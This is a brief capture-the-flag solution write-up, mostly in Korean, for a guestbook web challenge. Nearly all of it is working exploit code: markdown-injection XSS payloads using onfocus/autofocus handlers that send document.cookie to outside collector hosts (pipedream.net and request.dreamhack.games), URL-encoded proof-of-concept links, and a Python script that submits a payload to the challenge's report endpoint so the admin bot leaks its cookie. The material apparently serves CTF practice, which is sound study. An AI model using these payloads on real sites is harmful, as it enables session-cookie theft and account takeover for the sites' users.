[attack](javascript:alert`1`;' id="attack" onfocus=window.location.href='https://entsouynsb5snyx.m.pipedream.net/?ck='+document.cookie; autofocus)
poc 2
GuestBook.php?content=%5Btest%5D%28javascript%3Aalert%601%60%3B%27+id%3Dattack+onfocus%3Dwindow.location.href%3D%27https%3A%2F%2Fentsouynsb5snyx.m.pipedream.net%2F%3Fck%3D%27%2Bdocument.cookie%3B+autofocus%29#attack




해결 1 
GuestBook.php?content=%5bflag%5d(flag%27+tabindex%3d1+onfocusin%3dlocation.href%3d%22https%3A%2F%2Fblnbccj.request.dreamhack.games%3fflag%3d%22%2bdocument.cookie+name%3d%27flag%27+autofocus+id%3d%27flag) 
이런 식으로 report로 보내는 방법이 있고 

해결 2 
import requests


def main():
    content = "[bindon](' id='CONFIG' name='debug)[bindon](javascript:location.href=`https://blnbccj.request.dreamhack.games/${document.cookie}`' id='CONFIG' name='main)"
    data = { "path": f"GuestBook.php/?content=${content}" } # "/" is required(for disable Object.freeze)
    response = requests.post(url="http://host1.dreamhack.games:17938/Report.php", data=data)


if __name__ == "__main__":
    main()

이 거랑 비슷하게 프로그래밍으로 페이로드 값을 넣는 방법도 있다 
둘 다 가능하다 so simple! 
